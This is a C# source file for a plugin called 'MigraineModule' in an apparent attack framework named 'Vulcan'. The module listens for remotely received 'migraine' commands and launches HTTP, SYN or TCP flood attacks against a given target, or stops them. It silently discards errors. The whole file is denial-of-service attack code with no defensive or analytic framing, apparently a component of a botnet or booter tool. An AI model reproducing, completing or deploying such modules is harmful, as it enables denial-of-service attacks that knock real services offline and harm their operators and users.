using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Vulcan.Core;
using Vulcan.Core.Events;
using Vulcan.Core.PluginFramework;

namespace ModuleMigraine
{
    public class MigraineModule : IAttackModule
    {

        private IFloodAttack attack;

        public void InitModule(VulcanConfiguration config)
        {
            EventBus.GetEventBus().RegisterEventHandlers(this);
        }

        [EventSubscribe]
        public void RecieveCommand(EventCommandRecieved e)
        {
            if(e.Message.StartsWith("migraine "))
            {
                string[] args = e.Message.Split(' ');
                handleCommand(args);
            }
        }
        private void handleCommand(string[] args)
        {
            try
            {
                switch (args[1])
                {
                    case "http-flood":
                        attack = new HttpFlood(args[2], int.Parse(args[3]), int.Parse(args[4]),
                            int.Parse(args[5]));
                        attack.Start();
                        break;
                    case "syn-flood":
                        attack = new SynFlood(args[2], int.Parse(args[3]), int.Parse(args[4]),
                            int.Parse(args[5]), int.Parse(args[6]));
                        attack.Start();
                        break;
                    case "tcp-flood":
                        attack = new TcpFlood(args[2], int.Parse(args[3]), int.Parse(args[4]),
                            int.Parse(args[5]), int.Parse(args[6]));
                        attack.Start();
                        break;
                    case "stop":
                        attack.Stop();
                        break;
                }
            }
            catch
            {

            }
        }
    }
}
